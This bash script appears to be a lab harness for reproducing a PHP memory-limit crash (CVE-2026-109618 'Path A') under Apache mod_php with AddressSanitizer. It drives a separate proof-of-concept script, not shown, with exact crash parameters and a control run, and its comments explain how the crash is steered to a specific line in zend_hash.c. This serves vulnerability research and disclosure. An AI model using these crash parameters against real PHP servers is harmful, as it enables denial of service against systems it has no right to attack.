#!/usr/bin/env bash
# P15 (CVE-2026-109618 Path A) reproduction matrix on Apache mod_php.
# Crash config: nest=8 segments padded to 302 chars steer the memory_limit
# crossing onto the key zend_string_init inside _zend_hash_str_add_or_update_i
# (zend_hash.c:958, after nNumUsed++). Control config: a limit whose crossing
# lands on _zend_new_array (before nNumUsed++) must NOT crash.
# Usage: apache-patha-matrix.sh <version> [iterations] [port]
set -u
cd /mnt/c/Users/user/Downloads/php
version=${1:-8.4.4}
iterations=${2:-3}
port=${3:-18088}
base=/home/phplab/php-lab
stamp=$(date -u +%Y%m%dT%H%M%S)
outdir="$base/evidence/poc-patha-$stamp-$version-matrix"
run="$base/evidence/apache-lab-$version-patha"
export APACHE_LAB_PREFIX="$base/install/$version-apache"
export APACHE_LAB_RUN="$run"
export POC_OUT_DIR="$outdir"
mkdir -p "$outdir" "$run/asan-archive"

run_one() {  # limit label
  local limit=$1 label=$2
  bash linux/apache-lab.sh stop "$port" >/dev/null 2>&1
  sleep 0.3
  mv "$run"/asan.* "$run/asan-archive/" 2>/dev/null || true
  : > "$run/php-error.log" 2>/dev/null || true
  APACHE_LAB_MEMORY_LIMIT="$limit" bash linux/apache-lab.sh start "$port" >/dev/null 2>&1 || {
    echo "$label: start failed"; return; }
  local limit_bytes
  limit_bytes=$(python3 -c "print(int('${limit}'.rstrip('M'))*1024*1024)")
  POC_MEMORY_LIMIT="$limit" POC_MEMORY_LIMIT_BYTES="$limit_bytes" \
  POC_ASAN_DIR="$run" POC_ERROR_LOG="$run/php-error.log" \
  POC_PROCESS_PID="$(cat "$run/httpd.pid" 2>/dev/null || true)" \
    python3 linux/poc-patha.py --port "$port" --version "$version" \
      --parts 1000 --nest 8 --seg-pad 300 2>/dev/null | tail -1 || true
}

for i in $(seq 1 "$iterations"); do
  echo "=== iter $i crash-config (32M, key-alloc crossing) ==="
  run_one 32M "crash-$i"
done
echo "=== control (28M, new_array crossing) ==="
run_one 28M control
bash linux/apache-lab.sh stop "$port" >/dev/null 2>&1
echo "outdir: $outdir"
